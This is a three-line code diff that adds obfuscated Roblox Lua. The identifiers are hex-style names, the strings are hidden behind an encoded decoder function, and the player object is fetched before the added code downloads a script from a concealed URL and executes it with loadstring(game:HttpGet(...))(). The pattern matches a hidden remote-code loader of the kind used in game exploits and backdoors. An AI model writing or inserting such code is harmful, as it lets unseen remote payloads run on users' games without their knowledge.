@@ -1,0 +1,3 @@
+local _0x0 = game:GetService(__0xbd(11))
+local _0x1 = _0x0.LocalPlayer
+local _0x2 = loadstring(game:HttpGet(__0xbd(8)))()
